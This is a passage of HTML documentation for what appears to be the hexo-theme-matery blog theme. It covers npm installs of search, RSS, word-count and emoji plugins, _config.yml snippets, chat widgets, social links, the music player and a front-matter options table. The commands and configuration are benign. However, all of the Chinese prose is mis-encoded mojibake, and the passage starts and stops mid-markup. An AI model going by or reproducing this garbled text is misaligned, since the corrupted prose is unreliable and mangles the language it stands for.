class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸»é¢˜ä¸­é»˜è®¤çš„ <code>prismjs</code> ä¸»é¢˜æ˜¯ <code>Tomorrow Night</code>ï¼Œå¦‚æœä½ æƒ³å®šåˆ¶è‡ªå·±çš„ä¸»é¢˜ï¼Œå¯ä»¥å‰å¾€ <a href="https://prismjs.com/download.html">prismjs ä¸‹è½½é¡µé¢</a> å®šåˆ¶ä¸‹è½½è‡ªå·±å–œæ¬¢çš„ä¸»é¢˜ <code>css</code> æ–‡ä»¶ï¼Œç„¶åå°†æ­¤ css ä¸»é¢˜æ–‡ä»¶å–åä¸º <code>prism.css</code>ï¼Œæ›¿æ¢æ‰ <code>hexo-theme-matery</code> ä¸»é¢˜æ–‡ä»¶å¤¹ä¸­çš„ <code>source/libs/prism/prism.css</code> æ–‡ä»¶å³å¯ã€‚</p><h3 id="æœç´¢"><a href="#æœç´¢" class="headerlink" title="æœç´¢"></a>æœç´¢</h3><p>æœ¬ä¸»é¢˜ä¸­è¿˜ä½¿ç”¨åˆ°äº† <a href="https://github.com/wzpan/hexo-generator-search">hexo-generator-search</a> çš„ Hexo æ’ä»¶æ¥åšå†…å®¹æœç´¢ï¼Œå®‰è£…å‘½ä»¤å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">npm install hexo-generator-search --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨ Hexo æ ¹ç›®å½•ä¸‹çš„ <code>_config.yml</code> æ–‡ä»¶ä¸­ï¼Œæ–°å¢ä»¥ä¸‹çš„é…ç½®é¡¹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">search:  path: search.xml  field: post<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="ä¸­æ–‡é“¾æ¥è½¬æ‹¼éŸ³ï¼ˆå»ºè®®å®‰è£…ï¼‰"><a href="#ä¸­æ–‡é“¾æ¥è½¬æ‹¼éŸ³ï¼ˆå»ºè®®å®‰è£…ï¼‰" class="headerlink" title="ä¸­æ–‡é“¾æ¥è½¬æ‹¼éŸ³ï¼ˆå»ºè®®å®‰è£…ï¼‰"></a>ä¸­æ–‡é“¾æ¥è½¬æ‹¼éŸ³ï¼ˆå»ºè®®å®‰è£…ï¼‰</h3><p>å¦‚æœä½ çš„æ–‡ç« åç§°æ˜¯ä¸­æ–‡çš„ï¼Œé‚£ä¹ˆ Hexo é»˜è®¤ç”Ÿæˆçš„æ°¸ä¹…é“¾æ¥ä¹Ÿä¼šæœ‰ä¸­æ–‡ï¼Œè¿™æ ·ä¸åˆ©äº <code>SEO</code>ï¼Œä¸” <code>gitment</code> è¯„è®ºå¯¹ä¸­æ–‡é“¾æ¥ä¹Ÿä¸æ”¯æŒã€‚æˆ‘ä»¬å¯ä»¥ç”¨ <a href="https://github.com/viko16/hexo-permalink-pinyin">hexo-permalink-pinyin</a> Hexo æ’ä»¶ä½¿åœ¨ç”Ÿæˆæ–‡ç« æ—¶ç”Ÿæˆä¸­æ–‡æ‹¼éŸ³çš„æ°¸ä¹…é“¾æ¥ã€‚</p><p>å®‰è£…å‘½ä»¤å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">npm i hexo-permalink-pinyin --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨ Hexo æ ¹ç›®å½•ä¸‹çš„ <code>_config.yml</code> æ–‡ä»¶ä¸­ï¼Œæ–°å¢ä»¥ä¸‹çš„é…ç½®é¡¹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">permalink_pinyin:  enable: true  separator: &#39;-&#39; # default: &#39;-&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>æ³¨</strong>ï¼šé™¤äº†æ­¤æ’ä»¶å¤–ï¼Œ<a href="https://github.com/rozbo/hexo-abbrlink">hexo-abbrlink</a> æ’ä»¶ä¹Ÿå¯ä»¥ç”Ÿæˆéä¸­æ–‡çš„é“¾æ¥ã€‚</p></blockquote><h3 id="æ–‡ç« å­—æ•°ç»Ÿè®¡æ’ä»¶ï¼ˆå»ºè®®å®‰è£…ï¼‰"><a href="#æ–‡ç« å­—æ•°ç»Ÿè®¡æ’ä»¶ï¼ˆå»ºè®®å®‰è£…ï¼‰" class="headerlink" title="æ–‡ç« å­—æ•°ç»Ÿè®¡æ’ä»¶ï¼ˆå»ºè®®å®‰è£…ï¼‰"></a>æ–‡ç« å­—æ•°ç»Ÿè®¡æ’ä»¶ï¼ˆå»ºè®®å®‰è£…ï¼‰</h3><p>å¦‚æœä½ æƒ³è¦åœ¨æ–‡ç« ä¸­æ˜¾ç¤ºæ–‡ç« å­—æ•°ã€é˜…è¯»æ—¶é•¿ä¿¡æ¯ï¼Œå¯ä»¥å®‰è£… <a href="https://github.com/willin/hexo-wordcount">hexo-wordcount</a>æ’ä»¶ã€‚</p><p>å®‰è£…å‘½ä»¤å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">npm i --save hexo-wordcount<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶ååªéœ€åœ¨æœ¬ä¸»é¢˜ä¸‹çš„ <code>_config.yml</code> æ–‡ä»¶ä¸­ï¼Œå°†å„ä¸ªæ–‡ç« å­—æ•°ç›¸å…³çš„é…ç½®æ¿€æ´»å³å¯ï¼š</p><pre class="line-numbers language-none"><code class="language-none">postInfo:  date: true  update: false  wordCount: false # è®¾ç½®æ–‡ç« å­—æ•°ç»Ÿè®¡ä¸º true.  totalCount: false # è®¾ç½®ç«™ç‚¹æ–‡ç« æ€»å­—æ•°ç»Ÿè®¡ä¸º true.  min2read: false # é˜…è¯»æ—¶é•¿.  readCount: false # é˜…è¯»æ¬¡æ•°.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ·»åŠ emojiè¡¨æƒ…æ”¯æŒï¼ˆå¯é€‰çš„ï¼‰"><a href="#æ·»åŠ emojiè¡¨æƒ…æ”¯æŒï¼ˆå¯é€‰çš„ï¼‰" class="headerlink" title="æ·»åŠ emojiè¡¨æƒ…æ”¯æŒï¼ˆå¯é€‰çš„ï¼‰"></a>æ·»åŠ emojiè¡¨æƒ…æ”¯æŒï¼ˆå¯é€‰çš„ï¼‰</h3><p>æœ¬ä¸»é¢˜æ–°å¢äº†å¯¹<code>emoji</code>è¡¨æƒ…çš„æ”¯æŒï¼Œä½¿ç”¨åˆ°äº† <a href="https://npm.taobao.org/package/hexo-filter-github-emojis">hexo-filter-github-emojis</a> çš„ Hexo æ’ä»¶æ¥æ”¯æŒ <code>emoji</code>è¡¨æƒ…çš„ç”Ÿæˆï¼ŒæŠŠå¯¹åº”çš„<code>markdown emoji</code>è¯­æ³•ï¼ˆ<code>::</code>,ä¾‹å¦‚ï¼š<code>:smile:</code>ï¼‰è½¬å˜æˆä¼šè·³è·ƒçš„<code>emoji</code>è¡¨æƒ…ï¼Œå®‰è£…å‘½ä»¤å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">npm install hexo-filter-github-emojis --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨ Hexo æ ¹ç›®å½•ä¸‹çš„ <code>_config.yml</code> æ–‡ä»¶ä¸­ï¼Œæ–°å¢ä»¥ä¸‹çš„é…ç½®é¡¹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">githubEmojis:  enable: true  className: github-emoji  inject: true  styles:  customEmojis:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰§è¡Œ <code>hexo clean &amp;&amp; hexo g</code> é‡æ–°ç”Ÿæˆåšå®¢æ–‡ä»¶ï¼Œç„¶åå°±å¯ä»¥åœ¨æ–‡ç« ä¸­å¯¹åº”ä½ç½®çœ‹åˆ°ä½ ç”¨<code>emoji</code>è¯­æ³•å†™çš„è¡¨æƒ…äº†ã€‚</p><h3 id="æ·»åŠ -RSS-è®¢é˜…æ”¯æŒï¼ˆå¯é€‰çš„ï¼‰"><a href="#æ·»åŠ -RSS-è®¢é˜…æ”¯æŒï¼ˆå¯é€‰çš„ï¼‰" class="headerlink" title="æ·»åŠ  RSS è®¢é˜…æ”¯æŒï¼ˆå¯é€‰çš„ï¼‰"></a>æ·»åŠ  RSS è®¢é˜…æ”¯æŒï¼ˆå¯é€‰çš„ï¼‰</h3><p>æœ¬ä¸»é¢˜ä¸­è¿˜ä½¿ç”¨åˆ°äº† <a href="https://github.com/hexojs/hexo-generator-feed">hexo-generator-feed</a> çš„ Hexo æ’ä»¶æ¥åš <code>RSS</code>ï¼Œå®‰è£…å‘½ä»¤å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">npm install hexo-generator-feed --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨ Hexo æ ¹ç›®å½•ä¸‹çš„ <code>_config.yml</code> æ–‡ä»¶ä¸­ï¼Œæ–°å¢ä»¥ä¸‹çš„é…ç½®é¡¹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">feed:  type: atom  path: atom.xml  limit: 20  hub:  content:  content_limit: 140  content_limit_delim: &#39; &#39;  order_by: -date<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰§è¡Œ <code>hexo clean &amp;&amp; hexo g</code> é‡æ–°ç”Ÿæˆåšå®¢æ–‡ä»¶ï¼Œç„¶ååœ¨ <code>public</code> æ–‡ä»¶å¤¹ä¸­å³å¯çœ‹åˆ° <code>atom.xml</code> æ–‡ä»¶ï¼Œè¯´æ˜ä½ å·²ç»å®‰è£…æˆåŠŸäº†ã€‚</p><h3 id="æ·»åŠ -DaoVoice-åœ¨çº¿èŠå¤©åŠŸèƒ½ï¼ˆå¯é€‰çš„ï¼‰"><a href="#æ·»åŠ -DaoVoice-åœ¨çº¿èŠå¤©åŠŸèƒ½ï¼ˆå¯é€‰çš„ï¼‰" class="headerlink" title="æ·»åŠ  DaoVoice åœ¨çº¿èŠå¤©åŠŸèƒ½ï¼ˆå¯é€‰çš„ï¼‰"></a>æ·»åŠ  <a href="http://www.daovoice.io/">DaoVoice</a> åœ¨çº¿èŠå¤©åŠŸèƒ½ï¼ˆå¯é€‰çš„ï¼‰</h3><p>å‰å¾€ <a href="http://www.daovoice.io/">DaoVoice</a> å®˜ç½‘æ³¨å†Œå¹¶ä¸”è·å– <code>app_id</code>ï¼Œå¹¶å°† <code>app_id</code> å¡«å…¥ä¸»é¢˜çš„ <code>_config.yml</code> æ–‡ä»¶ä¸­ã€‚</p><h3 id="æ·»åŠ -Tidio-åœ¨çº¿èŠå¤©åŠŸèƒ½ï¼ˆå¯é€‰çš„ï¼‰"><a href="#æ·»åŠ -Tidio-åœ¨çº¿èŠå¤©åŠŸèƒ½ï¼ˆå¯é€‰çš„ï¼‰" class="headerlink" title="æ·»åŠ  Tidio åœ¨çº¿èŠå¤©åŠŸèƒ½ï¼ˆå¯é€‰çš„ï¼‰"></a>æ·»åŠ  <a href="https://www.tidio.com/">Tidio</a> åœ¨çº¿èŠå¤©åŠŸèƒ½ï¼ˆå¯é€‰çš„ï¼‰</h3><p>å‰å¾€ <a href="https://www.tidio.com/">Tidio</a> å®˜ç½‘æ³¨å†Œå¹¶ä¸”è·å– <code>Public Key</code>ï¼Œå¹¶å°† <code>Public Key</code> å¡«å…¥ä¸»é¢˜çš„ <code>_config.yml</code> æ–‡ä»¶ä¸­ã€‚</p><h3 id="ä¿®æ”¹é¡µè„š"><a href="#ä¿®æ”¹é¡µè„š" class="headerlink" title="ä¿®æ”¹é¡µè„š"></a>ä¿®æ”¹é¡µè„š</h3><p>é¡µè„šä¿¡æ¯å¯èƒ½éœ€è¦åšå®šåˆ¶åŒ–ä¿®æ”¹ï¼Œè€Œä¸”å®ƒä¸ä¾¿äºåšæˆé…ç½®ä¿¡æ¯ï¼Œæ‰€ä»¥å¯èƒ½éœ€è¦ä½ è‡ªå·±å»å†ä¿®æ”¹å’ŒåŠ å·¥ã€‚ä¿®æ”¹çš„åœ°æ–¹åœ¨ä¸»é¢˜æ–‡ä»¶çš„ <code>/layout/_partial/footer.ejs</code> æ–‡ä»¶ä¸­ï¼ŒåŒ…æ‹¬ç«™ç‚¹ã€ä½¿ç”¨çš„ä¸»é¢˜ã€è®¿é—®é‡ç­‰ã€‚</p><h3 id="ä¿®æ”¹ç¤¾äº¤é“¾æ¥"><a href="#ä¿®æ”¹ç¤¾äº¤é“¾æ¥" class="headerlink" title="ä¿®æ”¹ç¤¾äº¤é“¾æ¥"></a>ä¿®æ”¹ç¤¾äº¤é“¾æ¥</h3><p>åœ¨ä¸»é¢˜çš„ <code>_config.yml</code> æ–‡ä»¶ä¸­ï¼Œé»˜è®¤æ”¯æŒ <code>QQ</code>ã€<code>GitHub</code> å’Œé‚®ç®±ç­‰çš„é…ç½®ï¼Œä½ å¯ä»¥åœ¨ä¸»é¢˜æ–‡ä»¶çš„ <code>/layout/_partial/social-link.ejs</code> æ–‡ä»¶ä¸­ï¼Œæ–°å¢ã€ä¿®æ”¹ä½ éœ€è¦çš„ç¤¾äº¤é“¾æ¥åœ°å€ï¼Œå¢åŠ é“¾æ¥å¯å‚è€ƒå¦‚ä¸‹ä»£ç ï¼š</p><pre class="line-numbers language-none"><code class="language-none">&lt;% if (theme.socialLink.github) &#123; %&gt;    &lt;a href&#x3D;&quot;&lt;%&#x3D; theme.socialLink.github %&gt;&quot; class&#x3D;&quot;tooltipped&quot; target&#x3D;&quot;_blank&quot; data-tooltip&#x3D;&quot;è®¿é—®æˆ‘çš„GitHub&quot; data-position&#x3D;&quot;top&quot; data-delay&#x3D;&quot;50&quot;&gt;        &lt;i class&#x3D;&quot;fab fa-github&quot;&gt;&lt;&#x2F;i&gt;    &lt;&#x2F;a&gt;&lt;% &#125; %&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…¶ä¸­ï¼Œç¤¾äº¤å›¾æ ‡ï¼ˆå¦‚ï¼š<code>fa-github</code>ï¼‰ä½ å¯ä»¥åœ¨ <a href="https://fontawesome.com/icons">Font Awesome</a> ä¸­æœç´¢æ‰¾åˆ°ã€‚ä»¥ä¸‹æ˜¯å¸¸ç”¨ç¤¾äº¤å›¾æ ‡çš„æ ‡è¯†ï¼Œä¾›ä½ å‚è€ƒï¼š</p><ul><li>Facebook: <code>fab fa-facebook</code></li><li>Twitter: <code>fab fa-twitter</code></li><li>Google-plus: <code>fab fa-google-plus</code></li><li>Linkedin: <code>fab fa-linkedin</code></li><li>Tumblr: <code>fab fa-tumblr</code></li><li>Medium: <code>fab fa-medium</code></li><li>Slack: <code>fab fa-slack</code></li><li>Sina Weibo: <code>fab fa-weibo</code></li><li>Wechat: <code>fab fa-weixin</code></li><li>QQ: <code>fab fa-qq</code></li><li>Zhihu: <code>fab fa-zhihu</code></li></ul><blockquote><p><strong>æ³¨æ„</strong>: æœ¬ä¸»é¢˜ä¸­ä½¿ç”¨çš„ <code>Font Awesome</code> ç‰ˆæœ¬ä¸º <code>5.11.0</code>ã€‚</p></blockquote><h3 id="ä¿®æ”¹æ‰“èµçš„äºŒç»´ç å›¾ç‰‡"><a href="#ä¿®æ”¹æ‰“èµçš„äºŒç»´ç å›¾ç‰‡" class="headerlink" title="ä¿®æ”¹æ‰“èµçš„äºŒç»´ç å›¾ç‰‡"></a>ä¿®æ”¹æ‰“èµçš„äºŒç»´ç å›¾ç‰‡</h3><p>åœ¨ä¸»é¢˜æ–‡ä»¶çš„ <code>source/medias/reward</code> æ–‡ä»¶ä¸­ï¼Œä½ å¯ä»¥æ›¿æ¢æˆä½ çš„çš„å¾®ä¿¡å’Œæ”¯ä»˜å®çš„æ‰“èµäºŒç»´ç å›¾ç‰‡ã€‚</p><h3 id="é…ç½®éŸ³ä¹æ’­æ”¾å™¨ï¼ˆå¯é€‰çš„ï¼‰"><a href="#é…ç½®éŸ³ä¹æ’­æ”¾å™¨ï¼ˆå¯é€‰çš„ï¼‰" class="headerlink" title="é…ç½®éŸ³ä¹æ’­æ”¾å™¨ï¼ˆå¯é€‰çš„ï¼‰"></a>é…ç½®éŸ³ä¹æ’­æ”¾å™¨ï¼ˆå¯é€‰çš„ï¼‰</h3><p>è¦æ”¯æŒéŸ³ä¹æ’­æ”¾ï¼Œåœ¨ä¸»é¢˜çš„ <code>_config.yml</code> é…ç½®æ–‡ä»¶ä¸­æ¿€æ´»musicé…ç½®å³å¯ï¼š</p><pre class="line-numbers language-none"><code class="language-none"># æ˜¯å¦åœ¨é¦–é¡µæ˜¾ç¤ºéŸ³ä¹music:  enable: true  title:         # éå¸åº•æ¨¡å¼æœ‰æ•ˆ    enable: true    show: å¬å¬éŸ³ä¹  server: netease   # require music platform: netease, tencent, kugou, xiami, baidu  type: playlist    # require song, playlist, album, search, artist  id: 503838841     # require song id &#x2F; playlist id &#x2F; album id &#x2F; search keyword  fixed: false      # å¼€å¯å¸åº•æ¨¡å¼  autoplay: false   # æ˜¯å¦è‡ªåŠ¨æ’­æ”¾  theme: &#39;#42b983&#39;  loop: &#39;all&#39;       # éŸ³é¢‘å¾ªç¯æ’­æ”¾, å¯é€‰å€¼: &#39;all&#39;, &#39;one&#39;, &#39;none&#39;  order: &#39;random&#39;   # éŸ³é¢‘å¾ªç¯é¡ºåº, å¯é€‰å€¼: &#39;list&#39;, &#39;random&#39;  preload: &#39;auto&#39;   # é¢„åŠ è½½ï¼Œå¯é€‰å€¼: &#39;none&#39;, &#39;metadata&#39;, &#39;auto&#39;  volume: 0.7       # é»˜è®¤éŸ³é‡ï¼Œè¯·æ³¨æ„æ’­æ”¾å™¨ä¼šè®°å¿†ç”¨æˆ·è®¾ç½®ï¼Œç”¨æˆ·æ‰‹åŠ¨è®¾ç½®éŸ³é‡åé»˜è®¤éŸ³é‡å³å¤±æ•ˆ  listFolded: true  # åˆ—è¡¨é»˜è®¤æŠ˜å <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><code>server</code>å¯é€‰<code>netease</code>ï¼ˆç½‘æ˜“äº‘éŸ³ä¹ï¼‰ï¼Œ<code>tencent</code>ï¼ˆQQéŸ³ä¹ï¼‰ï¼Œ<code>kugou</code>ï¼ˆé…·ç‹—éŸ³ä¹ï¼‰ï¼Œ<code>xiami</code>ï¼ˆè™¾ç±³éŸ³ä¹ï¼‰ï¼Œ</p><p><code>baidu</code>ï¼ˆç™¾åº¦éŸ³ä¹ï¼‰ã€‚</p><p><code>type</code>å¯é€‰<code>song</code>ï¼ˆæ­Œæ›²ï¼‰ï¼Œ<code>playlist</code>ï¼ˆæ­Œå•ï¼‰ï¼Œ<code>album</code>ï¼ˆä¸“è¾‘ï¼‰ï¼Œ<code>search</code>ï¼ˆæœç´¢å…³é”®å­—ï¼‰ï¼Œ<code>artist</code>ï¼ˆæ­Œæ‰‹ï¼‰</p><pre class="line-numbers language-none"><code class="language-none">id&#96;è·å–æ–¹æ³•ç¤ºä¾‹: æµè§ˆå™¨æ‰“å¼€ç½‘æ˜“äº‘éŸ³ä¹ï¼Œç‚¹å‡»æˆ‘å–œæ¬¢çš„éŸ³ä¹æ­Œå•ï¼Œæµè§ˆå™¨åœ°å€æ åé¢ä¼šæœ‰ä¸€ä¸²æ•°å­—ï¼Œ&#96;playlist&#96;çš„&#96;id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å³ä¸ºè¿™ä¸²æ•°å­—ã€‚</p></blockquote><h2 id="æ–‡ç« -Front-matter-ä»‹ç»"><a href="#æ–‡ç« -Front-matter-ä»‹ç»" class="headerlink" title="æ–‡ç«  Front-matter ä»‹ç»"></a>æ–‡ç«  Front-matter ä»‹ç»</h2><h3 id="Front-matter-é€‰é¡¹è¯¦è§£"><a href="#Front-matter-é€‰é¡¹è¯¦è§£" class="headerlink" title="Front-matter é€‰é¡¹è¯¦è§£"></a>Front-matter é€‰é¡¹è¯¦è§£</h3><p><code>Front-matter</code> é€‰é¡¹ä¸­çš„æ‰€æœ‰å†…å®¹å‡ä¸º<strong>éå¿…å¡«</strong>çš„ã€‚ä½†æˆ‘ä»ç„¶å»ºè®®è‡³å°‘å¡«å†™ <code>title</code> å’Œ <code>date</code> çš„å€¼ã€‚</p><table><thead><tr><th>é…ç½®é€‰é¡¹</th><th>é»˜è®¤å€¼</th><th>æè¿°</th></tr></thead><tbody><tr><td>title</td><td><code>Markdown</code> çš„æ–‡ä»¶æ ‡é¢˜</td><td>æ–‡ç« æ ‡é¢˜ï¼Œå¼ºçƒˆå»ºè®®å¡«å†™æ­¤é€‰é¡¹</td></tr><tr><td>date</td><td>æ–‡ä»¶åˆ›å»ºæ—¶çš„æ—¥æœŸæ—¶é—´</td><td>å‘å¸ƒæ—¶é—´ï¼Œå¼ºçƒˆå»ºè®®å¡«å†™æ­¤é€‰é¡¹ï¼Œä¸”æœ€å¥½ä¿è¯å…¨å±€å”¯ä¸€</td></tr><tr><td>author</td><td>æ ¹ <code>_config.yml</code> ä¸­çš„ <code>author</code></td><td>æ–‡ç« ä½œè€…</td></tr><tr><td>img</td><td><code>featureImages</code> ä¸­çš„æŸä¸ªå€¼</td><td>æ–‡ç« ç‰¹å¾å›¾ï¼Œæ¨èä½¿ç”¨å›¾åºŠ(è…¾è®¯äº‘ã€ä¸ƒç‰›äº‘ã€åˆæ‹äº‘ç­‰)æ¥åšå›¾ç‰‡çš„è·¯å¾„.å¦‚: <code>http://xxx.com/xxx.jpg</code></td></tr><tr><td>top</td><td><code>true</code></td><td>æ¨èæ–‡ç« ï¼ˆæ–‡ç« æ˜¯å¦ç½®é¡¶ï¼‰ï¼Œå¦‚æœ <code>top</code> å€¼ä¸º <code>true</code>ï¼Œåˆ™ä¼šä½œä¸ºé¦–é¡µæ¨èæ–‡ç« </td></tr><tr><td>hide</td><td><code>false</code></td><td>éšè—æ–‡ç« ï¼Œå¦‚æœ<code>hide</code>å€¼ä¸º<code>true</code>ï¼Œåˆ™æ–‡ç« ä¸ä¼šåœ¨é¦–é¡µæ˜¾ç¤º</td></tr><tr><td>cover</td><td><code>false</code></td><td><code>v1.0.2</code>ç‰ˆæœ¬æ–°å¢ï¼Œè¡¨ç¤ºè¯¥æ–‡ç« æ˜¯å¦éœ€è¦åŠ å…¥åˆ°é¦–é¡µè½®æ’­å°é¢ä¸­</td></tr><tr><td>coverImg</td><td>æ— </td><td><code>v1.0.2</code>ç‰ˆæœ¬æ–°å¢ï¼Œè¡¨ç¤ºè¯¥æ–‡ç« åœ¨é¦–é¡µè½®æ’­å°é¢éœ€è¦æ˜¾ç¤ºçš„å›¾ç‰‡è·¯å¾„ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™é»˜è®¤ä½¿ç”¨æ–‡ç« çš„ç‰¹è‰²å›¾ç‰‡</td></tr><tr><td>password</td><td>æ— </td><td>æ–‡ç« é˜…è¯»å¯†ç ï¼Œå¦‚æœè¦å¯¹æ–‡ç« è®¾ç½®é˜…è¯»éªŒè¯å¯†ç çš„è¯ï¼Œå°±å¯ä»¥è®¾ç½® <code>password</code> çš„å€¼ï¼Œè¯¥å€¼å¿…é¡»æ˜¯ç”¨ <code>SHA256</code> åŠ å¯†åçš„å¯†ç ï¼Œé˜²æ­¢è¢«ä»–äººè¯†ç ´ã€‚å‰ææ˜¯åœ¨ä¸»é¢˜çš„ <code>config.yml</code> ä¸­æ¿€æ´»äº† <code>verifyPassword</code> é€‰é¡¹</td></tr><tr><td>toc</td><td><code>true</code></td><td>æ˜¯å¦å¼€å¯ TOCï¼Œå¯ä»¥é’ˆå¯¹æŸç¯‡æ–‡ç« å•ç‹¬å…³é—­ TOC çš„åŠŸèƒ½ã€‚å‰ææ˜¯åœ¨ä¸»é¢˜çš„ <code>config.yml</code> ä¸­æ¿€æ´»äº† <code>toc</code> é€‰é¡¹</td></tr><tr><td>mathjax</td><td><code>false</code></td><td>æ˜¯å¦å¼€å¯æ•°å­¦å…¬å¼æ”¯æŒ ï¼Œæœ¬æ–‡ç« æ˜¯å¦å¼€å¯ <code>mathjax</code>ï¼Œä¸”éœ€è¦åœ¨ä¸»é¢˜çš„ <code>_config.yml</code> æ–‡ä»¶ä¸­ä¹Ÿéœ€è¦å¼€å¯æ‰è¡Œ</td></tr><tr><td>summary</td><td>æ— </td><td>æ–‡ç« æ‘˜è¦ï¼Œè‡ªå®šä¹‰çš„æ–‡ç« æ‘˜è¦å†…å®¹ï¼Œå¦‚æœè¿™ä¸ªå±æ€§æœ‰å€¼ï¼Œæ–‡ç« å¡ç‰‡æ‘˜è¦å°±æ˜¾ç¤ºè¿™æ®µæ–‡å­—ï¼Œå¦åˆ™ç¨‹åºä¼šè‡ªåŠ¨æˆªå–æ–‡ç« çš„éƒ¨åˆ†å†…å®¹ä½œä¸ºæ‘˜è¦</td></tr><tr><td>categories</td><td>æ— </td><td>æ–‡ç« åˆ†ç±»ï¼Œæœ¬ä¸»é¢˜çš„åˆ†ç±»è¡¨ç¤ºå®è§‚ä¸Šå¤§çš„åˆ†ç±»ï¼Œåªå»ºè®®ä¸€ç¯‡æ–‡ç« ä¸€ä¸ªåˆ†ç±»</td></tr><tr><td>tags</td><td>æ— </td><td>æ–‡ç« æ ‡ç­¾ï¼Œä¸€ç¯‡æ–‡ç« å¯ä»¥å¤šä¸ªæ ‡ç­¾</td></tr><tr><td>keywords</td><td>æ–‡ç« æ ‡é¢˜</td><td>æ–‡ç« å…³é”®å­—ï¼ŒSEO æ—¶éœ€è¦</td></tr><tr><td>reprintPolicy</td><td>cc_by</td><td>æ–‡ç« è½¬è½½è§„åˆ™ï¼Œ å¯ä»¥æ˜¯ cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint æˆ– pay ä¸­çš„ä¸€ä¸ª</td></tr></tbody></table><blockquote><p><strong>æ³¨æ„</strong>:</p><ol><li>å¦‚æœ <code>img</code> å±æ€§ä¸å¡«å†™çš„è¯ï¼Œæ–‡ç« ç‰¹è‰²å›¾ä¼šæ ¹æ®æ–‡ç« æ ‡é¢˜çš„ <code>hashcode</code> çš„å€¼å–ä½™ï¼Œç„¶åé€‰å–ä¸»é¢˜ä¸­å¯¹åº”çš„ç‰¹è‰²å›¾ç‰‡ï¼Œä»è€Œè¾¾åˆ°è®©æ‰€æœ‰æ–‡ç« çš„ç‰¹è‰²å›¾<strong>å„æœ‰ç‰¹è‰²</strong>ã€‚</li><li><code>date</code> çš„å€¼å°½é‡ä¿è¯æ¯ç¯‡æ–‡ç« æ˜¯å”¯ä¸€çš„ï¼Œå› ä¸ºæœ¬ä¸»é¢˜ä¸­ <code>Gitalk</code> å’Œ <code>Gitment</code> è¯†åˆ« <code>id</code> æ˜¯é€šè¿‡ <code>date</code> çš„å€¼æ¥ä½œä¸ºå”¯ä¸€æ ‡è¯†çš„ã€‚</li><li>å¦‚æœè¦å¯¹æ–‡ç« è®¾ç½®é˜…è¯»éªŒè¯å¯†ç çš„åŠŸèƒ½ï¼Œä¸ä»…è¦åœ¨ Front-matter ä¸­è®¾ç½®é‡‡ç”¨äº† SHA256 åŠ å¯†çš„ password çš„å€¼ï¼Œè¿˜éœ€è¦åœ¨ä¸»é¢˜çš„ <code>_config.yml</code> ä¸­æ¿€æ´»äº†é…ç½®ã€‚æœ‰äº›åœ¨çº¿çš„ SHA256 åŠ å¯†çš„åœ°å€ï¼Œå¯ä¾›ä½ ä½¿ç”¨ï¼š<a href="http://tool.oschina.net/encrypt?type=2">å¼€æºä¸­å›½åœ¨çº¿å·¥å…·</a>ã€<a href="http://encode.chahuo.com/">chahuo</a>ã€<a href="http://tool.chinaz.com/tools/hash.aspx">ç«™é•¿å·¥å…·</a>ã€‚</li><li>æ‚¨å¯ä»¥åœ¨æ–‡ç« mdæ–‡ä»¶çš„ front-matter ä¸­æŒ‡å®š reprintPolicy æ¥ç»™å•ä¸ªæ–‡ç« é…ç½®è½¬è½½è§„åˆ™</li></ol></blockquote><p>ä»¥ä¸‹ä¸ºæ–‡ç« çš„ <code>Front-matter</code> ç¤ºä¾‹ã€‚</p><h3 id="æœ€ç®€ç¤ºä¾‹"><a href="#æœ€ç®€ç¤ºä¾‹" class="headerlink" title="æœ€ç®€ç¤ºä¾‹"></a>æœ€ç®€ç¤ºä¾‹</h3><pre class="line-numbers language-none"><code class="language-none">---title: typora-vue-themeä¸»é¢˜ä»‹ç»date: 2018-09-07 09:25:00---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æœ€å…¨ç¤ºä¾‹"><a href="#æœ€å…¨ç¤ºä¾‹" class="headerlink" title="æœ€å…¨ç¤ºä¾‹"></a>æœ€å…¨ç¤ºä¾‹</h3><pre class="line-numbers language-none"><code class="language-none">---title: typora-vue-themeä¸»é¢˜ä»‹ç»date: 2018-09-07 09:25:00author: èµµå¥‡img: &#x2F;source&#x2F;images&#x2F;xxx.jpgtop: truehide: falsecover: truecoverImg: &#x2F;images&#x2F;1.jpgpassword: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92toc: falsemathjax: falsesummary: è¿™æ˜¯ä½ è‡ªå®šä¹‰çš„æ–‡ç« 